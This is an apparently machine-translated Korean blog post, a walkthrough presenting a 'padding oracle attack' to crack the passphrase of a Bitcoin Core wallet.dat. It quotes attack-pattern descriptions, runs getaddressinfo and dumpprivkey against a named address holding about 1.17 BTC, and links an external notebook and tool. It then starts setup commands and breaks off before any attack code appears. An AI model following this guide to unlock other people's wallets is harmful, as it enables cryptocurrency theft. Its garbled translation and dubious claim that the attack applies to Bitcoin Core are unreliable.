# 인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/0aCfT-kCRlw?si=4WBhkNaS1Yw4okF6" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://capec.mitre.org/data/definitions/463.html" target="_blank" rel="noreferrer noopener">이 기사에서는 사이버 보안 리소스 [CAPEC™]</a>&nbsp;의 일반적인 공격 패턴 분류를 사용합니다&nbsp;.&nbsp;<a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">“Padding Oracle Attack”은</a>&nbsp;2012년&nbsp;<a href="https://en.bitcoin.it/wiki/Wallet" target="_blank" rel="noreferrer noopener">Wallet.dat&nbsp;</a><em>(취약성 관리 및 위협 분석 플랫폼&nbsp;<a href="https://github.com/vuldb" target="_blank" rel="noreferrer noopener"><strong>“VulDB”</strong></a>&nbsp;)</em>&nbsp;에서&nbsp;처음 논의되었습니다&nbsp;.&nbsp;가장 인기 있는&nbsp;<strong><a href="https://github.com/bitcoin/bitcoin" target="_blank" rel="noreferrer noopener">비트코인 ​​코어</a></strong><strong><code>AES Encryption Padding</code></strong>&nbsp;지갑의 문제가 파일&nbsp;&nbsp;작업에 영향을 미칩니다&nbsp;<strong><code>Wallet.dat</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>이 공격의 기술적 세부 사항은 다음과 같이 알려져 있습니다.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4104,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-71-1024x250.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4104"/><figcaption class="wp-element-caption"><a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noreferrer noopener">https://en.wikipedia.org/wiki/Padding_oracle_attack</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>대상 시스템에서 암호문을 복호화할 때 패딩 오류가 발생했는지 여부에 대한 정보가 유출되면 공격자가 복호화 키를 알지 못해도 데이터를 효과적으로 복호화할 수 있습니다.&nbsp;이러한 유형의 정보를 전송하는 대상 시스템은 패딩 오라클이 되며, 공격자는 복호화 키를 알지 못한 채 이 오라클을 사용하여 데이터를 효율적으로 복호화하여&nbsp;<code>128*b</code>패딩 오라클에 평균 호출을&nbsp;<code>b</code>발행 할 수 있습니다.&nbsp;암호문 블록).&nbsp;암호 해독을 수행하는 것 외에도 공격자는 암호화 키를 알지 못한 채 패딩 오라클을 사용하여 유효한 암호문을 생성(즉, 암호화 수행)할 수도 있습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4107} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-72.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4107"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>암호화된 메시지가 해독되기 전에 유효성을 보장하기 위해 인증되지 않고 패딩 오류 정보가 공격자에게 전달되는 경우 모든 암호화 시스템은 패딩 오라클 공격에 취약할 수 있습니다.&nbsp;예를 들어 이 공격 방법은 CAPTCHA 시스템을 손상시키거나 클라이언트 측 개체(예: 숨겨진 필드 또는 쿠키)에 저장된 상태 정보를 해독/수정하는 데 사용될 수 있습니다.&nbsp;</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4110} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-75.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4110"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>이 공격 방법은 제대로 구현되지 않은 암호 해독 절차에서 유출된 데이터를 사용하여 암호 시스템을 완전히 훼손하는 암호 시스템에 대한 부채널 공격입니다.&nbsp;어떤 형태로든 암호 해독 중에 패딩 오류가 발생했는지 여부를 공격자에게 알려주는 단일 정보만으로도 공격자가 암호 시스템을 깨뜨릴 수 있습니다.&nbsp;이 정보는 명시적인 완료 오류 메시지, 빈 페이지 반환 또는 서버 응답 시간이 더 오래 걸린다는 정보(타이밍 공격)의 형태로 나타날 수 있습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4111} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-76.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4111"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>이 공격은 공격자가 도메인 간 정보 유출을 사용하여 피해자가 상호 작용하는 대상 시스템/서비스의 패딩 오라클로부터 정보 비트를 얻을 수 있는 크로스 도메인 모드에서 실행될 수 있습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4112} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-77.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4112"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>대칭 암호화에서는 AES-256-CBC 암호화 모드(비트코인 코어에서 사용됨)에서 패딩 오라클 공격을 수행할 수 있으며, 여기서 "오라클"(소스)은 암호화된 메시지의 패딩이 올바른지 또는 아니다.&nbsp;<strong>이러한 데이터를 통해 공격자는 암호화 키를 알지 못한 채</strong>oracle 키를 사용하여 oracle을 통해 메시지를 해독할 수 있습니다&nbsp; .<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4117} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-78-1024x396.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4117"/><figcaption class="wp-element-caption">Wallet.dat에 대한 Oracle 공격 프로세스 패딩</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>프로세스에서 Wallet.dat 파일의 oracle을 채우고 궁극적으로 바이너리 형식으로 필요한 비밀번호를 찾기 위해 실제적인 부분으로 넘어가 익스플로잇을 통해 일련의 작업을 수행해 보겠습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4122} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-79.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4122"/><figcaption class="wp-element-caption"><code>Capture The Flag (CTF)</code></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>앞서 연구원들과 토너먼트 참가자들은&nbsp;<code>CTF</code>해킹된 [&nbsp;<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.dat&nbsp;<em>2023</em></a>&nbsp;] 비트코인 ​​지갑:&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;금액을 공개했습니다&nbsp;<em>:&nbsp;&nbsp;</em><strong><code><strong><code>44502.42</code></strong></code>&nbsp;미국 달러 // BITCOIN:&nbsp;<code>1.17<strong>461256</strong>&nbsp;BTC</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4134,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4134"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">Bitcoin Core 버전 22.1</a>&nbsp;에 대한 링크를 따라가 보겠습니다.<code>releases</code><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4138,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-81-1024x507.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4138"/></a><figcaption class="wp-element-caption">https://github.com/bitcoin/bitcoin/releases</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading">/bin/bitcoin-core-22.1/ 색인</h1>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://bitcoincore.org/bin/">../ </a><a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc1/">test.rc1/</a> 2022년 11월 8일 18:08 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/test.rc2/">test.rc2/</a> 2022년 11월 28일 09:39 - <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS">SHA256SUMS</a> 2022년 12월 14일 17:59 2353 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.asc">SHA256SUMS.asc</a> 2022년 12월 14일 17:59 10714 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/SHA256SUMS.ots">SHA256SUMS.ots</a> 2022년 12월 14일 17:59 538 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-aarch64-linux-gnu.tar.gz">bitcoin-22.1-aarch64-linux-gnu.tar.gz 2022년</a> 12월 14일 17:59 34264786 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-arm-linux-gnueabihf.tar.gz">bitcoin-22.1-arm-linux-gnueabihf.tar.gz</a> 14- 2022년 12월 18:00 30424198 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx-signed.dmg">bitcoin-22.1-osx-signed.dmg</a> 2022년 12월 14일 18:00 14838454 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-osx64.tar.gz">bitcoin-22.1-osx64.tar.gz</a> 2022 년 12월 14일 18:00 27930578 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64-linux-gnu.tar.gz">bitcoin-22.1-powerpc64-linux -gnu.tar.gz</a> 2022년 12월 14일 18:00 39999102 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-powerpc64le-linux-gnu.tar.gz">bitcoin-22.1-powerpc64le-linux-gnu.tar.gz 2022년</a> 12월 14일 18:00 38867643 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-riscv64-linux-gnu.tar.gz">bitcoin-22.1-riscv64-linux-gnu.tar.gz</a> 2022년 12월 14일 18:01 34114511 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64-setup.exe">bitcoin-22.1-win64-setup.exe</a> 2022년 12월 14일 18:01 18771672 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-win64.zip">bitcoin-22.1-win64.zip</a> 2022 년 12월 14일 18:01 34263968 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1-x86_64-linux-gnu.tar.gz">bitcoin-22.1-x86_64-linux -gnu.tar.gz</a> 2022년 12월 14일 18:01 35964880 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.tar.gz">bitcoin-22.1.tar.gz</a> 2022년 12월 14일 18:01 8122372 <a href="https://bitcoincore.org/bin/bitcoin-core-22.1/bitcoin-22.1.torrent">bitcoin-22.1.torrent</a> 2022년 12월 14일 18:01 49857</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener">비트코인 코어 버전 22.1</a>&nbsp;설치<a href="https://github.com/bitcoin/bitcoin/releases" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif.gif" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">반드시!&nbsp;QT 프로그램 재시작 // 비트코인 ​​코어 재시작</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>다음 키를 누르세요.<strong><code>Ctrl + Q</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code><strong>QT</strong></code>새 파일을 동기화하려면&nbsp;프로그램을 다시 시작해야 합니다.<code><strong>wallet.dat</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif01.gif" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">getaddressinfo 명령을 사용하여 확인해 보겠습니다. 비트코인 ​​지갑:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo "address"

Return information about the given bitcoin address.
Some of the information will only be present if the address is in the active wallet.
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>다음 명령을 실행해 보겠습니다.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>getaddressinfo 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b </code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>결과:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>{
  "address": "1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b",
  "scriptPubKey": "76a9147774801e52a110aba2d65ecc58daf0cfec95a09f88ac",
  "ismine": true,
  "solvable": true,
  "desc": "pkh(&#91;7774801e]02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f)#qzqmjdel",
  "iswatchonly": false,
  "isscript": false,
  "iswitness": false,
  "pubkey": "02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f",
  "iscompressed": true,
  "ischange": false,
  "timestamp": 1,
  "labels": &#91;
    ""
  ]
}</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif02.gif" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">dumpprivkey 명령을 실행하여 비트코인 ​​지갑의 개인 키를 가져옵니다:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey "address"

Reveals the private key corresponding to 'address'.
Then the importprivkey can be used with this output</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>다음 명령을 실행해 보겠습니다.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>결과:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Error: Please enter the wallet passphrase with walletpassphrase first. (code -13)</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif03.gif" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">비트코인 지갑의</a>&nbsp;개인 키에 대한 접근은&nbsp;&nbsp;비밀번호로 보호되어 있음을 알 수 있습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>passphrase ?!?!?
passphrase ?!?!?
passphrase ?!?!?</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>비밀번호를 바이너리 형식으로 실행 하고 해독해 보겠습니다. 이를 위해서는&nbsp;<strong><a href="https://github.com/bitcoin/bitcoin.git">비트코인 ​​코어 통합/스테이징 트리</a></strong><code><strong>Padding Oracle Attack на Wallet.dat</strong></code>&nbsp;저장소를 설치해야 합니다&nbsp;. 이를 위해&nbsp;&nbsp;<strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">Jupyter Notebook&nbsp; 에서 완성된 파일을 열고&nbsp;</a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener">&nbsp;Google Colab&nbsp;</a></strong>&nbsp;노트북 에 업로드 할 수 있습니다&nbsp;.<strong><a href="https://github.com/bitcoin/bitcoin.git"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong><strong><a href="https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://colab.research.google.com/drive/1rBVTPyePTMjwXganiwkHfz59vcAtN5Wt
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3896,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-29-1024x164.png" alt="Libbitcoin Explorer 3.x 라이브러리의 Milk Sad 취약점, Bitcoin Wallet(BTC) 사용자로부터 $900,000를 도난당한 방법" class="wp-image-3896"/></a><figcaption class="wp-element-caption"><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat">ht&nbsp;</a><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">tps://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat</a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Padding_Oracle_Attack_on_Wallet_dat.ipynb</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">https://colab.research.google.com</a>&nbsp;링크를 사용하여&nbsp;<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">Google Colab</a>&nbsp;서비스를 열어 보겠습니다.<a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3735} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-11.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3735"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>클릭&nbsp;<strong><code>"+"</code></strong>하고&nbsp;<em><strong>"새 메모장 만들기"를 클릭하세요.</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3738} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-12.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3738"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Google Colab에 Ruby 설치</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":3740} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-13-1024x487.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3740"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>필요한 프로그램을 실행하기 위해 객체 지향 프로그래밍 언어인&nbsp;<a href="https://www.ruby-lang.org/" target="_blank" rel="noreferrer noopener"><strong>Ruby를 설치하겠습니다.</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!sudo apt install ruby-full</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4167} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-82-1024x750.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4167"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>설치 버전을 확인해보자</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ruby --version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3747} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-15.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-3747"/><figcaption class="wp-element-caption">Ruby 버전 3.0.2p107(2021-07-07 개정 0db68f0233) [x86_64-linux-gnu]</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'bitcoin-ruby'</code>비트코인 프로토콜/네트워크와 상호 작용하기 위한&nbsp;라이브러리를 설치해 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install bitcoin-ruby</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4168} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-83-1024x674.png" alt="인기 있는 비트코인 ​​코어 지갑에 대한 Wallet.dat 비밀번호 해독에 대한 패딩 오라클 공격" class="wp-image-4168"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'ecdsa'</code>ECDSA(Elliptic Curve Digital Signature Algorithm)를 구현하기 위한&nbsp;라이브러리를 설치해 보겠습니다.</p>
